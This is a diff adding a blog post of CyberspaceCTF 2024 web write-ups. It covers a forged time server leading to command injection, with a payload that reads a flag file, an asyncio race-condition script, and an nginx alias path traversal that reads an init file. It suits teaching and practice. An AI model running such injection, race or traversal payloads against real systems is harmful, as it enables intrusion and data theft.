@@ -1,0 +1,371 @@
+---
+title: Cyberspace CTF 2024 Writeups
+date: '2024-09-02'
+tags: ['livectfs', 'writeups', 'web']
+draft: false
+summary: Writeups for challenges I solved (and worked extensively on).
+---
+
+# Prologue
+CyberspaceCTF24 has a bunch of challenges. I worked on some Cryptos, Webs and Forensics, but the Cryptos were either basic or lattice (gonna do a lattice crypto bootcamp soon), the Forensics were basics and guessy; thus I'm just gonna do writeups for some web ones. 
+I did not solve all the webs, but have looked extensively at all of them except the `Snippet` challenge. This post will focus on the cool techniques presented in the solves.
+
+# Web Writeups
+
+## Feature Unlock, Easy, 50 points (184 solves)
+This challenge is mostly about reading and understanding a small Flask app. 
+- In summary, there's a feature presenting command injection and you can dump the flag or do rev shell. 
+- To get to that feature, you need a valid `access_token`. That requires you to validate the time (Need to be 6 days from CTF time then)
+- You can get the time from a quote quote "Time Server"
+- You can specify the url of the time server, and the confirmation uses the public key sent by the time server as well
+- Thus just forge the Time Server, and get to the command injection and win
+
+Solve script:
+```
+import requests
+import base64
+import json
+
+server_url = "https://feature-unlocked-web.challs.csc.tf/"
+solve_server = "https://prices-minute-fingers-journey.trycloudflare.com" #Change to your server url
+
+
+DEFAULT_PREFERENCES = base64.b64encode(json.dumps({
+    'theme': 'light',
+    'language': 'en',
+    'validation_server': solve_server
+}).encode()).decode()
+
+# Step one, send to /release to get access token
+cookies = {
+    "preferences": DEFAULT_PREFERENCES
+}
+
+r = requests.get(server_url + "release?debug=true", cookies=cookies)
+for cookie in r.cookies:
+    print(cookie.name, cookie.value)
+access_token = r.cookies["access_token"]
+print(access_token)
+
+# Step two, win?
+cookies = {
+    "access_token": access_token
+}
+data = {"text": "a; cat /home/user/flag.txt #"}
+r = requests.post(server_url + "feature", data=data, cookies=cookies)
+print(r.text)
+```
+
+## Trendzz, Medium, 175 points (86 solves)
+This is one part of a 3-part web challenges. Basically it is a Go-HTMX website with forum features, admin and superadmin. Smells XSS right? Yes, but that's for the other 2 parts.
+This part is about the ever rising in prevalence **TOCTOU** in web challenges.
+Relevant source code:
+```
+package service
+
+import (
+	"app/handlers/db"
+	"fmt"
+	"os"
+	"regexp"
+	"strings"
+
+	"github.com/gin-gonic/gin"
+	"github.com/google/uuid"
+	"github.com/microcosm-cc/bluemonday"
+)
+
+type Post struct {
+	PostID string
+	Title  string
+	Data   string
+	User   string
+}
+
+func InsertPost(username string, title string, data string) string {
+	DB := db.GetDBconn()
+	postID := uuid.New().String()
+	_, err := DB.Exec("INSERT INTO posts (postid, username, title, data) VALUES ($1, $2, $3, $4)", postID, username, title, data)
+	if err != nil {
+		fmt.Println(err)
+	}
+	return postID
+}
+
+func GetAllPosts() []Post {
+	DB := db.GetDBconn()
+	rows, err := DB.Query("SELECT postid, title, username FROM posts")
+	if err != nil {
+		fmt.Println(err)
+	}
+	var posts []Post
+	for rows.Next() {
+		var post Post
+		post.Data = ""
+		err := rows.Scan(&post.PostID, &post.Title, &post.User)
+		if strings.Contains(post.Title, "Welcome") {
+			post.User = "NA :)"
+		}
+		if err != nil {
+			fmt.Println(err)
+		}
+		posts = append(posts, post)
+	}
+	return posts
+}
+
+func GetPostsByUsername(username string) []Post {
+	DB := db.GetDBconn()
+	rows, err := DB.Query("SELECT postid, title FROM posts WHERE username = $1", username)
+	if err != nil {
+		fmt.Println(err)
+	}
+	var posts []Post
+	for rows.Next() {
+		var post Post
+		post.Data = ""
+		post.User = username
+		err := rows.Scan(&post.PostID, &post.Title)
+		if err != nil {
+			fmt.Println(err)
+		}
+		posts = append(posts, post)
+	}
+	return posts
+}
+
+func CheckNoOfPosts(username string) int {
+	DB := db.GetDBconn()
+	var count int
+	err := DB.QueryRow("SELECT COUNT(*) FROM posts WHERE username = $1", username).Scan(&count)
+	if err != nil {
+		fmt.Println(err)
+	}
+	return count
+}
+
+func SanitizeData(data string) string {
+	p := bluemonday.NewPolicy()
+	p.AllowURLSchemesMatching(regexp.MustCompile("^https?"))
+	p.AllowAttrs("alt", "cite", "datetime", "dir", "high", "hx-delete", "hx-get", "hx-patch", "hx-post", "hx-put", "hx-swap", "hx-target", "hx-trigger", "hx-vals", "id", "low", "map", "max", "min", "name", "optimum", "value").OnElements("a", "abbr", "acronym", "b", "br", "cite", "code", "dfn", "div", "em", "figcaption", "h1", "h2", "h3", "h4", "h5", "h6", "hgroup", "hr", "i", "mark", "p", "pre", "s", "samp", "small", "span", "strike", "strong", "sub", "sup", "tt", "var", "wbr")
+	html := p.Sanitize(data)
+	return html
+}
+
+func ShowPost(ctx *gin.Context) {
+	postID := ctx.Param("postid")
+	DB := db.GetDBconn()
+	var title string
+	var data string
+	err := DB.QueryRow("SELECT title, data FROM posts WHERE postid = $1", postID).Scan(&title, &data)
+	if err != nil {
+		fmt.Println(err)
+	}
+	html := SanitizeData(data)
+	ctx.PureJSON(200, gin.H{
+		"title": title, "data": html})
+}
+
+func CreatePost(ctx *gin.Context) {
+	username := ctx.MustGet("username").(string)
+	noOfPosts := CheckNoOfPosts(username)
+	var req struct {
+		Title string `json:"title"`
+		Data  string `json:"data"`
+	}
+	if err := ctx.BindJSON(&req); err != nil {
+		ctx.JSON(400, gin.H{"error": "Invalid request"})
+		fmt.Println(err)
+		return
+	}
+	if noOfPosts >= 10 {
+		ctx.JSON(200, gin.H{"error": "You have reached the maximum number of posts"})
+		return
+	}
+	if len(req.Data) > 210 {
+		ctx.JSON(200, gin.H{"error": "Data length should be less than 210 characters"})
+		return
+	}
+	postID := InsertPost(username, req.Title, req.Data)
+	ctx.JSON(200, gin.H{"postid": postID})
+}
+
+func DisplayFlag(ctx *gin.Context) {
+	username := ctx.MustGet("username").(string)
+	noOfPosts := CheckNoOfPosts(username)
+	if noOfPosts <= 12 {
+
+		ctx.JSON(200, gin.H{"error": fmt.Sprintf("You need %d more posts to view the flag", 12-noOfPosts)})
+		return
+	}
+	ctx.JSON(200, gin.H{"flag": os.Getenv("POST_FLAG")})
+}
+```
+
+After some light inspection you'll see the goal is the get 12 posts, but when posting there's a **check** that prevents you from posting if you are at 10 posts. 
+Firstly, the post counting query `err := DB.QueryRow("SELECT COUNT(*) FROM posts WHERE username = $1", username).Scan(&count)` smells a bit like SQLi, but no, it is not, we tried :(.
+Thus the only *smelly* thing left is **Race Condition**, or *time of check - time of use* **TOCTOU**. I came to the realization that whenever a web challenge has
+- A seammingly impossible task has to be done
+- Requiring you to pass a check
+- Then get the result and give it to you
+- **AND** the server is not single-threaded
+
+That is wifey **TOCTOU** material right there. 
+
+Let's dive deeper into why TOCTOU works here.
+
+```
+func CheckNoOfPosts(username string) int {
+	DB := db.GetDBconn()
+	var count int
+	err := DB.QueryRow("SELECT COUNT(*) FROM posts WHERE username = $1", username).Scan(&count)
+	if err != nil {
+		fmt.Println(err)
+	}
+	return count
+}
+
+func CreatePost(ctx *gin.Context) {
+	username := ctx.MustGet("username").(string)
+	noOfPosts := CheckNoOfPosts(username)
+	var req struct {
+		Title string `json:"title"`
+		Data  string `json:"data"`
+	}
+	if err := ctx.BindJSON(&req); err != nil {
+		ctx.JSON(400, gin.H{"error": "Invalid request"})
+		fmt.Println(err)
+		return
+	}
+	if noOfPosts >= 10 {
+		ctx.JSON(200, gin.H{"error": "You have reached the maximum number of posts"})
+		return
+	}
+	if len(req.Data) > 210 {
+		ctx.JSON(200, gin.H{"error": "Data length should be less than 210 characters"})
+		return
+	}
+	postID := InsertPost(username, req.Title, req.Data)
+	ctx.JSON(200, gin.H{"postid": postID})
+}
+```
+
+Intuitively you would think `CheckNoOfPosts()` is called before `InsertPost()` so what the heck? But then, if we have multiple concurrent requests, then there's a chance the check happens before some **INSERT INTO** operations completed. 
+The gap (12-10 = 2) is pretty small so the chance that Race Condition works here is pretty great. Only matter to discuss now is implementation.
+
+Players discussed a great deal about implementation in the CyberspaceCTF discord. Here's my summary after going through all of them:
+- **BurpSuite Repeater sending in group**. [Read Here](https://portswigger.net/burp/documentation/desktop/tools/repeater/send-group). (Easy to implement if TOCTOU requires small number of requests, no overhead work)
+- **TurboIntruder** [Read Here](https://portswigger.net/web-security/race-conditions#detecting-and-exploiting-limit-overrun-race-conditions-with-turbo-intruder). Has to be HTTP/2, require some setup.
+- **Python asyncio and aiohttp** [Read Here](https://book.hacktricks.xyz/pentesting-web/race-condition#improving-single-packet-attack). More control over what to send, a little bit of work.
+
+TOCTOU templates?
+```
+# Collected 
+import requests
+import asyncio
+import aiohttp
+
+s = requests.session()
+
+async def make_request(session):
+    data = {
+        "title": "zob",
+        "data": "zob"
+    }
+    async with session.post(f"{url}/user/posts/create", json=data) as response:
+        return await response.text()
+
+async def flag():
+    async with aiohttp.ClientSession(cookies=cookies) as session:
+        tasks = []
+        for _ in range(30):
+            task = asyncio.create_task(make_request(session))
+            tasks.append(task)
+
+        await asyncio.gather(*tasks)
+    response = s.get(f"{url}/user/flag")
+    print(s.text)
+
+asyncio.run(flag())
+```
+My teammate uses TurboIntruder to solve this one. 
+
+
+## Trendz, Medium, 383 points (52 solves)
+Still the same source code, but I'll delve into the intended vulnerability for this one.
+There's an nginx configuration file:
+```
+
+user  nobody;
+worker_processes  auto;
+
+events {
+    worker_connections  1024;
+}
+
+
+http {
+    include       mime.types;
+    default_type  application/octet-stream;
+
+    sendfile        on;
+    keepalive_timeout  65;
+
+    server {
+        listen       80;
+        server_name  localhost;
+        location / {
+            proxy_pass http://localhost:8000;
+        }
+        location /static {
+            alias /app/static/;
+        }
+        error_page   500 502 503 504  /50x.html;
+        location = /50x.html {
+            root   html;
+        }
+
+    }
+
+}
+```
+
+Back when I was doing a challenge that doesn't require exploiting nginx problems, I ran into this [Nginx pitfalls article](https://rezaduty-1685945445294.hashnode.dev/nginx-path-configuration-pitfalls), which is the key to solving the challenge.
+Alternatively, the [HackTrick article](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/nginx) is also fire. 
+
+The vuln lies in the `location-alias` directive. Basically when you request `/static../something`, it'll get resolved to `/app/static/../something` on the server. Oops, LFI and Path Traversal alert!
+
+Alright, where do you get the flag with LFI then?
+
+Taking a look at the ``run.sh`` file:
+```
+#!/bin/env sh
+cat /dev/urandom | head | sha1sum | cut -d " " -f 1 > /app/jwt.secret
+
+export JWT_SECRET_KEY=notsosecurekey
+export ADMIN_FLAG=CSCTF{flag1} 
+export POST_FLAG=CSCTF{flag2} 
+export SUPERADMIN_FLAG=CSCTF{flag3} 
+export REV_FLAG=CSCTF{flag4}
+export POSTGRES_USER=postgres
+export POSTGRES_PASSWORD=mysecretpassword
+export POSTGRES_DB=devdb
+
+uuid=$(cat /proc/sys/kernel/random/uuid)
+user=$(cat /dev/urandom | head | md5sum | cut -d " " -f 1)
+cat << EOF >> /docker-entrypoint-initdb.d/init.sql
+	INSERT INTO users (username, password, role) VALUES ('superadmin', 'superadmin', 'superadmin');
+    INSERT INTO posts (postid, username, title, data) VALUES ('$uuid', '$user', 'Welcome to the CTF!', '$ADMIN_FLAG');
+EOF
+
+docker-ensure-initdb.sh & 
+GIN_MODE=release /app/chall & sleep 5
+su postgres -c "postgres -D /var/lib/postgresql/data" &
+
+nginx -g 'daemon off;' 
+```
+
+Nice, getting `/docker-entrypoint-initdb.d/init.sql` gives us the $ADMIN_FLAG for this challenge.
+
+## Trendzzz, Medium, 442 points (37 solves)
+XSS by writing (swapping) directly to the DOM, awesome [writeup](https://gist.github.com/ky28059/5af97a38d168d540bda2e5b3ae1324bf) by my teammate [Kevin Yu](https://github.com/ky28059). Definitely check out his other writeups and show love (he does not have that "Buy me coffee" thingy tho)
